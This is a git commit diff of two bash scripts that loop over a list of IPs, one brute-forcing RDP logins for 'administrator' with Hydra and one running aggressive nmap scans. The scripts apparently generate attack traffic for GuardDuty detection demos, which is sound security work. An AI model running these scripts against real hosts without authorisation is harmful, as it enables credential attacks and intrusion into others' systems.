79f95bdb6619f3d88f133756bbba26b4682c04a6
Paul Hidalgo <me@paulhidalgo.net>
2018-07-04 18:20:43 +0800

    Brute and nMAP

--- bruteforce-rdp.sh
+++ bruteforce-rdp.sh
@@ -1,10 +1,9 @@
 #!/bin/bash
-echo "Running RDP Bruteforce"
-rm -rf hydra.restore
+echo "----Running RDP Bruteforce---"
 filename='/tools/ips.txt'
-filelines=`cat $filename`
-echo Start
+filelines=$(cat $filename)
+echo 'Start'
 for ip in $filelines ; do
         /tools/hydra/hydra -q -t 4 -f -l administrator -P /tools/guardduty-demos/fake/passwords.txt rdp://$ip >> /var/log/bruteforce-rdp &
-        echo "/tools/hydra/hydra -q -t 4 -f -l administrator -P ./fake/passwords.txt rdp://$ip"
+        echo "/tools/hydra/hydra -q -t 4 -f -l administrator -P /tools/guardduty-demos/fake/passwords.txt rdp://$ip"
 done
--- nmap.sh
+++ nmap.sh
@@ -1,9 +1,9 @@
 #!/bin/bash
-echo "Running Port Scans"
+echo "---------- Running Port Scans ---------- "
 filename='/tools/ips.txt'
-filelines=`cat $filename`
-echo Start
+filelines=$(cat $filename)
+echo 'Start'
 for ip in $filelines ; do
         sudo nmap -v -A $ip >> /var/log/nmap &
-        echo "sudo nmap -A $ip >> /var/log/nmap &"
+        echo "sudo nmap -v -A $ip >> /var/log/nmap &"
 done
